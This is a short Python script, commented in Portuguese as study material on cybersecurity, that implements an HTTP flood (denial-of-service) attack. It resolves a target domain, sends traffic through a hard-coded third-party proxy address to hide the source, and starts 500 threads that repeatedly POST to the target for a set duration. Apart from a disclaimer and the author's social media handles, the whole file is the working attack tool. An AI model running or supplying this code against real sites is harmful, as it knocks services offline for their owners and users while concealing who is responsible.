# Sempre lembre-se, esse é um material didático para você estudar sobre Cybersecurity.
# Não seja imbecíl, não saia por aí achando que internet é Terra sem lei.
# Este projeto é completamente aberto à comunidade, como você usa ´resonsabilidade 100% sua.
# segue eu aí. IG: @lucaso_cientist In: https://www.linkedin.com/in/infoseclucasoliveira/


import socket
import threading
import time
import requests

# Enviar pacotes via proxy
def flood_attack_via_proxy(target_ip, target_port, duration, proxy):
    client = requests.Session()
    client.proxies = {
        "http": proxy,
        "https": proxy,
    }
    payload = b"A" * 10  # Pacote de dados
    timeout = time.time() + duration
    while time.time() < timeout:
        try:
            # Use `client.post` para enviar payloads de dados, ou remova `data=payload`
            response = client.post(f"http://{target_ip}:{target_port}", timeout=10)
        except Exception as e:
            print(f"Erro ao enviar pacote via proxy: {e}")
    client.close()

def main():
    target_host = "link.com"  # Use apenas o domínio sem o protocolo.
    try:
        target_ip = socket.gethostbyname(target_host)
        print(f"IP do site resolvido: {target_ip}")
    except socket.gaierror:
        print("Erro ao resolver o domínio.")
        return
    
    target_port = 80  # Porta do serviço HTTP.
    duration = 15  # Duração do teste em segundos.
    threads = []
    
    # Defina o proxy corretamente
    proxy = "http://18.228.149.161:80"  # Substitua pelo seu proxy

    # Criação de múltiplas threads para o teste
    for i in range(500):  
        thread = threading.Thread(target=flood_attack_via_proxy, args=(target_ip, target_port, duration, proxy))
        thread.start()
        threads.append(thread)

    for thread in threads:
        thread.join()

if __name__ == "__main__":
    main()
